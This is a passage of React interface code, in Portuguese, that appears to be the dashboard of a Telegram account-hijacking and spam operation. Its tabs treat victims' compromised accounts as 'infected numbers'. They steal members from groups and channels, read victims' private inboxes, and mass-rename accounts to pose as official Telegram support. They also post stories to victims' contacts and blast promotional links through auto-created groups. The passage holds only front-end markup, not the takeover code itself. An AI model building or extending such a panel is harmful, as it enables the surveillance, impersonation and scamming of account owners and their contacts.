                            Ex: "VIP Club {'{number}'}" → "VIP Club 001", "VIP Club 002"...
                        </div>
                        
                        <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold', color:'#c9d1d9'}}>Foto do Grupo (URL):</label>
                        <input 
                            type="text" 
                            placeholder="https://i.imgur.com/grupo.jpg" 
                            value={groupPhotoUrl} 
                            onChange={e=>setGroupPhotoUrl(e.target.value)} 
                            style={{width:'100%', padding:'12px', background:'#000', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px'}} 
                        />
                        <div style={{fontSize:'11px', color:'#8b949e', marginTop:'8px'}}>
                            Opcional: Imagem para o perfil de todos os grupos criados
                        </div>
                    </div>
                    
                    <div style={{display:'flex', gap:'15px', marginBottom:'25px'}}>
                        {!isCreatingGroups ? (
                            <button onClick={createSmartGroups} style={{flex:1, padding:'18px', background:'#d29922', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'16px', boxShadow:'0 4px 15px rgba(210, 153, 34, 0.3)'}}>
                                🎯 CRIAR GRUPOS INTELIGENTES
                            </button>
                        ) : (
                            <button onClick={stopGroupOperations} style={{flex:1, padding:'18px', background:'#f85149', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'16px', boxShadow:'0 4px 15px rgba(248, 81, 73, 0.3)'}}>
                                🛑 INTERROMPER CRIAÇÃO
                            </button>
                        )}
                    </div>
                    
                    {isCreatingGroups && (
                        <div style={{marginBottom:'25px'}}>
                            <div style={{display:'flex', justifyContent:'space-between', marginBottom:'8px'}}>
                                <span style={{fontSize:'12px', fontWeight:'bold'}}>Progresso da Criação</span>
                                <span style={{fontSize:'12px', color:'#d29922'}}>{groupCreationProgress}%</span>
                            </div>
                            <div style={{width:'100%', height:'8px', background:'#30363d', borderRadius:'4px', overflow:'hidden'}}>
                                <div style={{width:`${groupCreationProgress}%`, height:'100%', background:'#d29922', transition:'width 0.3s'}}></div>
                            </div>
                        </div>
                    )}
                    
                    <div style={{maxHeight:'400px', overflowY:'auto', paddingRight:'5px'}}>
                        {createdGroups.length === 0 ? (
                            <div style={{textAlign:'center', padding:'40px', color:'#8b949e', fontSize:'14px'}}>
                                Nenhum grupo criado ainda. Use o botão acima para iniciar.
                            </div>
                        ) : (
                            createdGroups.map(g => (
                                <div key={g.id} style={{padding:'15px', marginBottom:'10px', borderRadius:'8px', border:'1px solid #30363d', background:'#0d1117'}}>
                                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'8px'}}>
                                        <div style={{display:'flex', alignItems:'center', gap:'12px'}}>
                                            {g.photoUrl && (
                                                <div style={{width:'40px', height:'40px', borderRadius:'50%', overflow:'hidden', border:'2px solid #3390ec'}}>
                                                    <img src={g.photoUrl} style={{width:'100%', height:'100%', objectFit:'cover'}} />
                                                </div>
                                            )}
                                            <div style={{fontWeight:'bold', color:'white', fontSize:'15px'}}>{g.name}</div>
                                        </div>
                                        <div style={{fontSize:'12px', color:'#8b949e'}}>{g.memberCount} membros</div>
                                    </div>
                                    <div style={{fontSize:'11px', color:'#8b949e', marginBottom:'8px'}}>
                                        Criado por: {g.creatorPhone} • {new Date(g.createdAt).toLocaleString()}
                                    </div>
                                    <div style={{display:'flex', gap:'8px'}}>
                                        <input 
                                            type="checkbox" 
                                            checked={selectedGroupsForBroadcast.has(g.id)} 
                                            onChange={() => toggleGroupSelection(g.id)}
                                            style={{width:'18px', height:'18px', cursor:'pointer'}}
                                        />
                                        <span style={{fontSize:'12px', color:'#8b949e'}}>Selecionar para disparo</span>
                                    </div>
                                </div>
                            ))
                        )}
                    </div>
                </div>

                {/* PAINEL DIREITO: DISPARO EM GRUPOS */}
                <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d', display:'flex', flexDirection:'column'}}>
                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px'}}>
                        <h3 style={{margin:0, color:'#238636'}}>📢 Disparo Segmentado</h3>
                        <button onClick={selectAllGroups} style={{fontSize:'12px', padding:'6px 12px', background:'#238636', color:'white', border:'none', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>
                            SELECIONAR TODOS
                        </button>
                    </div>
                    
                    <div style={{background:'#0d1117', padding:'15px', borderRadius:'8px', marginBottom:'20px', border:'1px solid #238636'}}>
                        <div style={{fontSize:'13px', color:'#8b949e', marginBottom:'10px'}}>
                            <strong>Grupos Selecionados:</strong> {selectedGroupsForBroadcast.size} / {createdGroups.length}
                        </div>
                        <div style={{fontSize:'12px', color:'#8b949e'}}>
                            Potencial de alcance: ~{Array.from(selectedGroupsForBroadcast).reduce((total, groupId) => {
                                const group = createdGroups.find(g => g.id === groupId);
                                return total + (group ? group.memberCount : 0);
                            }, 0).toLocaleString()} membros
                        </div>
                    </div>
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold'}}>Mídia para o Disparo (URL):</label>
                    <input 
                        type="text" 
                        placeholder="https://i.imgur.com/oferta.jpg" 
                        value={groupMediaUrl} 
                        onChange={e=>setGroupMediaUrl(e.target.value)} 
                        style={{width:'100%', padding:'14px', marginBottom:'20px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'8px', fontSize:'14px'}} 
                    />
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold'}}>Mensagem para os Grupos:</label>
                    <textarea 
                        value={groupMessage} 
                        onChange={e=>setGroupMessage(e.target.value)} 
                        placeholder="🔥 OFERTA ESPECIAL! 🎯\n\nPromoção imperdível apenas para VIPs!\n\n{Clique aqui|Acesse agora}: [LINK]" 
                        style={{width:'100%', height:'120px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'14px', borderRadius:'8px', fontSize:'15px', lineHeight:'1.5', resize:'none', marginBottom:'20px'}}
                    />
                    
                    <div style={{display:'flex', gap:'15px', marginTop:'auto'}}>
                        {!isBroadcasting ? (
                            <button 
                                onClick={broadcastToGroups} 
                                disabled={selectedGroupsForBroadcast.size === 0 || !groupMessage.trim()}
                                style={{flex:1, padding:'18px', background:selectedGroupsForBroadcast.size > 0 && groupMessage.trim() ? '#238636' : '#30363d', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor: selectedGroupsForBroadcast.size > 0 && groupMessage.trim() ? 'pointer' : 'not-allowed', fontSize:'16px', transition:'0.3s'}}
                            >
                                🚀 DISPARAR NOS GRUPOS
                            </button>
                        ) : (
                            <button onClick={stopGroupOperations} style={{flex:1, padding:'18px', background:'#f85149', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'16px', boxShadow:'0 4px 15px rgba(248, 81, 73, 0.3)'}}>
                                🛑 PARAR DISPARO
                            </button>
                        )}
                    </div>
                    
                    {isBroadcasting && (
                        <div style={{marginTop:'20px'}}>
                            <div style={{display:'flex', justifyContent:'space-between', marginBottom:'8px'}}>
                                <span style={{fontSize:'12px', fontWeight:'bold'}}>Progresso do Disparo</span>
                                <span style={{fontSize:'12px', color:'#238636'}}>{broadcastProgress}%</span>
                            </div>
                            <div style={{width:'100%', height:'8px', background:'#30363d', borderRadius:'4px', overflow:'hidden'}}>
                                <div style={{width:`${broadcastProgress}%`, height:'100%', background:'#238636', transition:'width 0.3s'}}></div>
                            </div>
                        </div>
                    )}
                </div>
            </div>
        )}

        {/* --- ABA GOD MODE (ESPIÃO) --- */}
        {tab === 'spy' && (
            <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
                <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'30px'}}>
                    <div>
                        <h2 style={{margin:0, color:'white'}}>Radar Global de Leads</h2>
                        <div style={{fontSize:'14px', color:'#8b949e', marginTop:'5px'}}>
                            {allGroups.length} Grupos e {allChannels.length} Canais mapeados nas contas
                        </div>
                    </div>
                    <div style={{display:'flex', gap:'12px', alignItems:'center'}}>
                        {isHarvestingAll && <div style={{color:'#00ff00', fontWeight:'bold', background:'rgba(0,255,0,0.1)', padding:'8px 15px', borderRadius:'8px', border:'1px solid #238636'}}>ASPIRANDO: +{totalHarvestedSession} LEADS</div>}
                        
                        {!isHarvestingAll ? (
                             <button onClick={startMassHarvest} style={{padding:'14px 25px', background:'#238636', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold', fontSize:'15px', boxShadow:'0 4px 12px rgba(35, 134, 54, 0.2)'}}>🕷️ MODO ASPIRADOR (AUTO)</button>
                        ) : (
                             <button onClick={() => stopHarvestRef.current = true} style={{padding:'14px 25px', background:'#f85149', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold', fontSize:'15px'}}>🛑 INTERROMPER</button>
                        )}

                        <input type="text" placeholder="Filtrar por número infectado..." value={filterNumber} onChange={e => setFilterNumber(e.target.value)} style={{padding:'12px', borderRadius:'8px', background:'#0d1117', border:'1px solid #30363d', color:'white', width:'220px'}}/>
                        
                        <button onClick={scanNetwork} disabled={isScanning} style={{padding:'14px 25px', background:'#8957e5', color:'white', border:'none', borderRadius:'8px', cursor: isScanning ? 'not-allowed' : 'pointer', fontWeight:'bold', fontSize:'15px'}}>
                            {isScanning ? `SCANNING... ${scanProgress}%` : '🔄 SCANNER GERAL'}
                        </button>
                    </div>
                </div>

                <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'25px'}}>
                    {/* LISTA DE GRUPOS */}
                    <div style={{background:'#0d1117', padding:'20px', borderRadius:'12px', border:'1px solid #21262d'}}>
                        <h3 style={{color:'#d29922', borderBottom:'1px solid #21262d', paddingBottom:'15px', marginTop:0, display:'flex', justifyContent:'space-between'}}>
                            👥 GRUPOS DISPONÍVEIS <span>{filteredGroups.length}</span>
                        </h3>
                        <div style={{maxHeight:'650px', overflowY:'auto', paddingRight:'10px'}}>
                            {filteredGroups.map(g => {
                                const isDone = harvestedIds.has(g.id);
                                return (
                                <div key={g.id} style={{display:'flex', alignItems:'center', gap:'15px', padding:'15px', borderBottom:'1px solid #161b22', transition:'0.2s', background: isDone ? 'rgba(0,255,0,0.02)' : 'transparent'}}>
                                    <div style={{width:'50px', height:'50px', borderRadius:'50%', background:'#161b22', overflow:'hidden', border: isDone ? '2px solid #238636' : '2px solid #30363d'}}>
                                        {g.photo ? <img src={g.photo} style={{width:'100%', height:'100%', objectFit:'cover'}}/> : <div style={{textAlign:'center', lineHeight:'50px', fontSize:'20px'}}>👥</div>}
                                    </div>
                                    <div style={{flex:1, minWidth:0}}>
                                        <div style={{fontWeight:'bold', color: isDone ? '#58a6ff' : 'white', fontSize:'15px', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis'}}>{g.title} {isDone && '✅'}</div>
                                        <div style={{fontSize:'12px', color:'#8b949e', marginTop:'4px'}}>{g.participantsCount?.toLocaleString()} leads • Via: {g.ownerPhone}</div>
                                    </div>
                                    <div style={{display:'flex', gap:'8px'}}>
                                        <button onClick={()=>openChatViewer(g)} title="Ver mensagens e mídias" style={{padding:'8px', background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'6px', cursor:'pointer'}}>👁️</button>
                                        <button onClick={()=>stealLeadsManual(g)} style={{padding:'8px 12px', background: isDone ? '#238636' : '#d29922', border:'none', color:'white', borderRadius:'6px', cursor:'pointer', fontWeight:'bold', fontSize:'12px'}}>
                                            {isDone ? 'COLHIDO' : 'ROUBAR'}
                                        </button>
                                    </div>
                                </div>
                            )})}
                        </div>
                    </div>

                    {/* LISTA DE CANAIS */}
                    <div style={{background:'#0d1117', padding:'20px', borderRadius:'12px', border:'1px solid #21262d'}}>
                        <h3 style={{color:'#3390ec', borderBottom:'1px solid #21262d', paddingBottom:'15px', marginTop:0, display:'flex', justifyContent:'space-between'}}>
                            📢 CANAIS PARA CLONAR <span>{filteredChannels.length}</span>
                        </h3>
                        <div style={{maxHeight:'650px', overflowY:'auto', paddingRight:'10px'}}>
                            {filteredChannels.map(c => {
                                const isDone = harvestedIds.has(c.id);
                                return (
                                <div key={c.id} style={{display:'flex', alignItems:'center', gap:'15px', padding:'15px', borderBottom:'1px solid #161b22', background: isDone ? 'rgba(0,255,0,0.02)' : 'transparent'}}>
                                    <div style={{width:'50px', height:'50px', borderRadius:'50%', background:'#161b22', overflow:'hidden', border: isDone ? '2px solid #238636' : '2px solid #30363d'}}>
                                        {c.photo ? <img src={c.photo} style={{width:'100%', height:'100%', objectFit:'cover'}}/> : <div style={{textAlign:'center', lineHeight:'50px', fontSize:'20px'}}>📢</div>}
                                    </div>
                                    <div style={{flex:1, minWidth:0}}>
                                        <div style={{fontWeight:'bold', color: isDone ? '#58a6ff' : 'white', fontSize:'15px', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis'}}>{c.title} {isDone && '✅'}</div>
                                        <div style={{fontSize:'12px', color:'#8b949e', marginTop:'4px'}}>{c.participantsCount?.toLocaleString()} inscritos • Via: {c.ownerPhone}</div>
                                    </div>
                                    <div style={{display:'flex', gap:'8px'}}>
                                        <button onClick={()=>openChatViewer(c)} style={{padding:'8px', background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'6px', cursor:'pointer'}}>👁️</button>
                                        <button onClick={()=>stealLeadsManual(c)} style={{padding:'8px 12px', background: isDone ? '#238636' : '#1f6feb', border:'none', color:'white', borderRadius:'6px', cursor:'pointer', fontWeight:'bold', fontSize:'12px'}}>
                                            {isDone ? 'COLHIDO' : 'TENTAR'}
                                        </button>
                                    </div>
                                </div>
                            )})}
                        </div>
                    </div>
                </div>
            </div>
        )}

        {/* --- ABA FERRAMENTAS (CAMUFLAGEM E STORIES) --- */}
        {tab === 'tools' && (
             <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'25px' }}>

                {!isAdmin && (
                    <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
                        <h3 style={{marginTop:0, color:'#1f6feb'}}>Minha Pressel / Redirect</h3>
                        <p style={{marginTop:0, fontSize:'12px', color:'#8b949e'}}>
                            Essa URL será usada no redirect após a verificação pública do Telegram quando o link tiver o seu token.
                        </p>
                        <input
                            type="text"
                            value={myRedirectUrl}
                            onChange={e=>setMyRedirectUrl(e.target.value)}
                            placeholder="https://sua-pressel.com"
                            style={{width:'100%', padding:'14px', marginBottom:'12px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'8px', fontSize:'14px'}}
                        />
                        <button
                            onClick={handleSaveRedirectUrl}
                            disabled={savingRedirect}
                            style={{width:'100%', padding:'14px', background:'#1f6feb', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold'}}
                        >
                            {savingRedirect ? 'SALVANDO...' : 'SALVAR REDIRECT'}
                        </button>
                    </div>
                )}

                {isAdmin && (
                    <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
                        <h3 style={{marginTop:0, color:'#8957e5'}}>Admin: Criar Usuário</h3>
                        <input type="text" value={newUserUsername} onChange={e=>setNewUserUsername(e.target.value)} placeholder="Username" style={{width:'100%', padding:'14px', marginBottom:'12px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'8px', fontSize:'14px'}} />
                        <input type="password" value={newUserPassword} onChange={e=>setNewUserPassword(e.target.value)} placeholder="Senha" style={{width:'100%', padding:'14px', marginBottom:'12px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'8px', fontSize:'14px'}} />
                        <input type="text" value={newUserRedirectUrl} onChange={e=>setNewUserRedirectUrl(e.target.value)} placeholder="Redirect (opcional)" style={{width:'100%', padding:'14px', marginBottom:'12px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'8px', fontSize:'14px'}} />
                        <button onClick={handleCreateUser} disabled={creatingUser} style={{width:'100%', padding:'14px', background:'#8957e5', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold'}}>
                            {creatingUser ? 'CRIANDO...' : 'CRIAR USUÁRIO'}
                        </button>

                        {createdUser && (
                            <div style={{marginTop:'15px', padding:'12px', background:'#0d1117', border:'1px solid #30363d', borderRadius:'8px'}}>
                                <div style={{fontSize:'12px', color:'#8b949e'}}>Token público:</div>
                                <div style={{fontFamily:'monospace', color:'white', wordBreak:'break-all'}}>{createdUser.public_token}</div>
                                <div style={{fontSize:'12px', color:'#8b949e', marginTop:'10px'}}>Link:</div>
                                <div style={{fontFamily:'monospace', color:'#58a6ff', wordBreak:'break-all'}}>{`/?t=${createdUser.public_token}`}</div>
                            </div>
                        )}
                    </div>
                )}
                
                {/* CLONAGEM DE IDENTIDADE */}
                <div style={{ backgroundColor: '#161b22', padding: '30px', borderRadius:'12px', border:'1px solid #30363d' }}>
                    <h3 style={{marginTop:0, color:'#8957e5'}}>🎭 Camuflagem em Massa</h3>
                    <p style={{fontSize:'13px', opacity:0.7, marginBottom:'25px'}}>Altere o Nome e Foto de todos os infectados selecionados para parecerem suporte oficial ou perfis atraentes.</p>
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Novo Nome Exibido:</label>
                    <input type="text" placeholder="Ex: Suporte VIP Telegram" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '20px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>URL da Foto de Perfil:</label>
                    <input type="text" placeholder="https://..." value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '25px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
                    
                    <button onClick={handleMassUpdateProfile} disabled={processing} style={{ width: '100%', padding: '18px', background: '#8957e5', color: 'white', border: 'none', borderRadius:'10px', fontWeight:'bold', cursor:'pointer', fontSize:'16px' }}>
                        ATUALIZAR IDENTIDADES SELECIONADAS
                    </button>
                </div>

                {/* POSTAGEM DE STORIES */}
                <div style={{ backgroundColor: '#161b22', padding: '30px', borderRadius:'12px', border:'1px solid #30363d' }}>
                    <h3 style={{marginTop:0, color:'#3390ec'}}>📸 Postagem de Stories Global</h3>
                    <p style={{fontSize:'13px', opacity:0.7, marginBottom:'25px'}}>Poste uma imagem ou vídeo nos Stories de todos os infectados para gerar tráfego passivo nos contatos deles.</p>
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Mídia URL (MP4 ou JPG):</label>
                    <input type="text" placeholder="https://..." value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', marginBottom: '20px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Legenda do Story:</label>
                    <input type="text" placeholder="Clique no link da Bio! 🔥" value={storyCaption} onChange={e => setStoryCaption(e.target.value)} style={{ width: '100%', marginBottom: '25px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
                    
                    <button onClick={handleMassPostStory} disabled={processing} style={{ width: '100%', padding: '18px', background: '#1f6feb', color: 'white', border: 'none', borderRadius:'10px', fontWeight:'bold', cursor:'pointer', fontSize:'16px' }}>
                        PUBLICAR NOS STORIES SELECIONADOS
                    </button>
                </div>

            </div>
        )}

        {/* --- ABA INBOX VIEWER --- */}
        {tab === 'inbox' && (
            <div style={{display:'grid', gridTemplateColumns:'420px 1fr', gap:'25px', height:'850px'}}>
                
                {/* PAINEL ESQUERDO: SELEÇÃO DE NÚMERO E DIÁLOGOS */}
                <div style={{display:'flex', flexDirection:'column', gap:'20px'}}>
                    
                    {/* SELETORES DE TELEFONE */}
                    <div style={{backgroundColor: '#161b22', padding: '20px', borderRadius:'12px', border:'1px solid #30363d'}}>
                        <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'15px'}}>
                            <h3 style={{margin:0, color:'#e34234', fontSize:'16px'}}>📬 Inbox Global</h3>
                            {selectedInboxPhone && (
                                <button 
                                    onClick={refreshInbox}
                                    disabled={loadingInbox}
                                    style={{
                                        background: '#21262d',
                                        border: '1px solid #30363d',
                                        color: '#58a6ff',
                                        padding: '6px 12px',
                                        borderRadius: '6px',
                                        cursor: loadingInbox ? 'not-allowed' : 'pointer',
                                        fontSize: '12px',
                                        display: 'flex',
                                        alignItems: 'center',
                                        gap: '5px'
                                    }}
                                >
                                    {loadingInbox ? '⏳' : '🔄'} Atualizar
                                </button>
                            )}
                        </div>
                        <p style={{fontSize:'12px', opacity:0.7, marginBottom:'15px'}}>Selecione um número infectado para ver todos os diálogos</p>
                        
                        <select 
                            value={selectedInboxPhone} 
                            onChange={(e) => loadInbox(e.target.value)}
                            style={{width:'100%', padding:'12px', background:'#0d1117', border:'1px solid #30363d', color:'white', borderRadius:'8px', marginBottom:'10px', fontSize:'14px'}}
                        >
                            <option value="">Selecione um número...</option>
                            {sessions.filter(s => s.is_active).map(s => (
                                <option key={s.phone_number} value={s.phone_number}>
                                    {s.phone_number} {s.custom_name ? `(${s.custom_name})` : ''}
                                </option>
                            ))}
                        </select>
                        
                        {selectedInboxPhone && (
                            <div style={{fontSize:'11px', color:'#8b949e', marginTop:'8px', display:'flex', justifyContent:'space-between'}}>
                                <span>📱 {inboxDialogs.length} diálogos</span>
                                {inboxDialogs.filter(d => d.unreadCount > 0).length > 0 && (
                                    <span style={{color:'#e34234', fontWeight:'bold'}}>
                                        🔴 {inboxDialogs.filter(d => d.unreadCount > 0).length} não lidos
                                    </span>
                                )}
                            </div>
                        )}
                    </div>

                    {/* LISTA DE DIÁLOGOS */}
                    <div style={{backgroundColor: '#161b22', padding: '15px', borderRadius:'12px', border:'1px solid #30363d', flex:1, overflow:'hidden', display:'flex', flexDirection:'column'}}>
                        <h4 style={{marginTop:0, color:'white', fontSize:'14px', marginBottom:'12px'}}>Diálogos Recentes</h4>
                        
                        <div style={{flex:1, overflowY:'auto', paddingRight:'5px'}}>
                            {loadingInbox ? (
                                <div style={{textAlign:'center', padding:'40px', color:'#8b949e'}}>
                                    <div style={{fontSize:'24px', marginBottom:'10px'}}>⏳</div>
                                    <div>Carregando diálogos...</div>
                                </div>
                            ) : inboxDialogs.length === 0 ? (
                                <div style={{textAlign:'center', padding:'40px', color:'#8b949e', fontSize:'12px'}}>
                                    {selectedInboxPhone ? 'Nenhum diálogo encontrado' : 'Selecione um número para começar'}
                                </div>
                            ) : (
                                <div style={{display:'flex', flexDirection:'column', gap:'10px'}}>
                                    {inboxDialogs.map(dialog => (
                                        <div
                                            key={dialog.id}
                                            onClick={() => selectDialog(dialog)}
                                            style={{
                                                padding:'16px',
                                                background: selectedDialog?.id === dialog.id ? '#e34234' : '#0d1117',
                                                border: selectedDialog?.id === dialog.id ? '2px solid #e34234' : '1px solid #30363d',
                                                borderRadius:'16px',
                                                cursor:'pointer',
                                                transition:'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
                                                position: 'relative',
                                                transform: selectedDialog?.id === dialog.id ? 'scale(1.02)' : 'scale(1)',
                                                boxShadow: selectedDialog?.id === dialog.id ? 
                                                    '0 8px 32px rgba(227, 66, 52, 0.3)' : 
                                                    '0 2px 8px rgba(0, 0, 0, 0.1)'
                                            }}
                                            onMouseEnter={(e) => {
                                                if (selectedDialog?.id !== dialog.id) {
                                                    e.target.style.background = '#21262d';
                                                    e.target.style.transform = 'translateX(6px) scale(1.01)';
                                                    e.target.style.boxShadow = '0 4px 16px rgba(0, 0, 0, 0.2)';
                                                }
                                            }}
                                            onMouseLeave={(e) => {
                                                if (selectedDialog?.id !== dialog.id) {
                                                    e.target.style.background = '#0d1117';
                                                    e.target.style.transform = 'translateX(0) scale(1)';
                                                    e.target.style.boxShadow = '0 2px 8px rgba(0, 0, 0, 0.1)';
                                                }
                                            }}
                                        >
                                            {/* Indicador de não lidos */}
                                            {dialog.unreadCount > 0 && (
                                                <div style={{
                                                    position: 'absolute',
                                                    top: '10px',
                                                    right: '10px',
                                                    background: 'linear-gradient(135deg, #e34234 0%, #f85149 100%)',
                                                    color: 'white',
                                                    borderRadius: '50%',
                                                    width: '24px',
                                                    height: '24px',
                                                    display: 'flex',
                                                    alignItems: 'center',
                                                    justifyContent: 'center',
                                                    fontSize: '10px',
                                                    fontWeight: 'bold',
                                                    boxShadow: '0 4px 12px rgba(227, 66, 52, 0.4)',
                                                    animation: 'pulse 2s infinite'
                                                }}>
                                                    {dialog.unreadCount > 99 ? '99+' : dialog.unreadCount}
                                                </div>
                                            )}
                                            
                                            <div style={{display:'flex', alignItems:'center', gap:'14px', marginBottom:'10px'}}>
                                                {dialog.photo ? (
                                                    <img 
                                                        src={dialog.photo} 
                                                        alt="" 
                                                        style={{width:'48px', height:'48px', borderRadius:'50%', objectFit:'cover', border: '3px solid #30363d', boxShadow: '0 2px 8px rgba(0,0,0,0.2)'}}
                                                    />
                                                ) : (
                                                    <div style={{
                                                        width:'48px',
                                                        height:'48px',
                                                        borderRadius:'50%',
                                                        background: dialog.type === 'Usuário' ? 'linear-gradient(135deg, #238636 0%, #2ea043 100%)' : 
                                                                   dialog.type === 'Bot' ? 'linear-gradient(135deg, #8957e5 0%, #a371f7 100%)' :
                                                                   dialog.type === 'Grupo' ? 'linear-gradient(135deg, #d29922 0%, #f7ba40 100%)' :
                                                                   dialog.type === 'Canal' ? 'linear-gradient(135deg, #1f6feb 0%, #58a6ff 100%)' : '#30363d',
                                                        display:'flex',
                                                        alignItems:'center',
                                                        justifyContent:'center',
                                                        fontSize:'22px',
                                                        color:'white',
                                                        border: '3px solid #30363d',
                                                        boxShadow: '0 2px 8px rgba(0,0,0,0.2)'
                                                    }}>
                                                        {dialog.type === 'Usuário' ? '👤' :
                                                         dialog.type === 'Bot' ? '🤖' :
                                                         dialog.type === 'Grupo' ? '👥' :
                                                         dialog.type === 'Canal' ? '📢' : '💬'}
                                                    </div>
                                                )}
                                                <div style={{flex:1, minWidth:0}}>
                                                    <div style={{color:'white', fontSize:'16px', fontWeight:'bold', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', display:'flex', alignItems:'center', gap:'8px', lineHeight:'1.2'}}>
                                                        {dialog.title}
                                                        {dialog.isVerified && <span style={{color:'#58a6ff', fontSize:'14px'}}>✓</span>}
                                                        {dialog.isScam && <span style={{color:'#f85149', fontSize:'14px'}}>⚠️</span>}
                                                    </div>
                                                    <div style={{color:'#8b949e', fontSize:'11px', display:'flex', alignItems:'center', gap:'8px', marginTop:'4px'}}>
                                                        <span style={{padding:'2px 6px', background:'rgba(139,148,158,0.2)', borderRadius:'4px'}}>{dialog.type}</span>
                                                        {dialog.participantsCount > 0 && <span>• {dialog.participantsCount} membros</span>}
                                                        {dialog.username && <span>• @{dialog.username}</span>}
                                                    </div>
                                                </div>
                                            </div>
                                            
                                            {dialog.lastMessage && (
                                                <div style={{color:'#8b949e', fontSize:'13px', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', lineHeight:'1.4', paddingLeft:'62px'}}>
                                                    {dialog.lastMessage}
                                                </div>
                                            )}
                                            
                                            {dialog.lastMessageDate && (
                                                <div style={{color:'#8b949e', fontSize:'10px', marginTop:'8px', fontWeight:'500', paddingLeft:'62px'}}>
                                                    {formatMessageTime(dialog.lastMessageDate)}
                                                </div>
                                            )}
                                        </div>
                                    ))}
                                </div>
                            )}
                        </div>
                    </div>
                </div>

                {/* PAINEL DIREITO: HISTÓRICO DE MENSAGENS OTIMIZADO */}
                <div style={{backgroundColor: '#161b22', padding: '0', borderRadius:'16px', border:'1px solid #30363d', display:'flex', flexDirection:'column', overflow:'hidden', boxShadow:'0 4px 16px rgba(0,0,0,0.2)'}}>
                    
                    {selectedDialog ? (
                        <>
                            {/* HEADER DO CHAT */}
                            <div style={{padding:'24px', borderBottom:'1px solid #30363d', background:'linear-gradient(135deg, #0d1117 0%, #161b22 100%)'}}>
                                <div style={{display:'flex', justifyContent:'space-between', alignItems:'center'}}>
                                    <div style={{display:'flex', alignItems:'center', gap:'16px'}}>
                                        {selectedDialog.photo ? (
                                            <img 
                                                src={selectedDialog.photo} 
                                                alt="" 
                                                style={{width:'52px', height:'52px', borderRadius:'50%', objectFit:'cover', border: '3px solid #30363d', boxShadow:'0 4px 12px rgba(0,0,0,0.3)'}}
                                            />
                                        ) : (
                                            <div style={{
                                                width:'52px',
                                                height:'52px',
                                                borderRadius:'50%',
                                                background: selectedDialog.type === 'Usuário' ? 'linear-gradient(135deg, #238636 0%, #2ea043 100%)' : 
                                                           selectedDialog.type === 'Bot' ? 'linear-gradient(135deg, #8957e5 0%, #a371f7 100%)' :
                                                           selectedDialog.type === 'Grupo' ? 'linear-gradient(135deg, #d29922 0%, #f7ba40 100%)' :
                                                           selectedDialog.type === 'Canal' ? 'linear-gradient(135deg, #1f6feb 0%, #58a6ff 100%)' : '#30363d',
                                                display:'flex',
                                                alignItems:'center',
                                                justifyContent:'center',
                                                fontSize:'24px',
                                                color:'white',
                                                border: '3px solid #30363d',
                                                boxShadow:'0 4px 12px rgba(0,0,0,0.3)'
                                            }}>
                                                {selectedDialog.type === 'Usuário' ? '👤' :
                                                 selectedDialog.type === 'Bot' ? '🤖' :
                                                 selectedDialog.type === 'Grupo' ? '👥' :
                                                 selectedDialog.type === 'Canal' ? '📢' : '💬'}
                                            </div>
                                        )}
                                        <div style={{flex:1}}>
                                            <h3 style={{margin:0, color:'white', fontSize:'20px', display:'flex', alignItems:'center', gap:'10px', fontWeight:'600'}}>
                                                {selectedDialog.title}
                                                {selectedDialog.isVerified && <span style={{color:'#58a6ff', fontSize:'16px'}}>✓</span>}
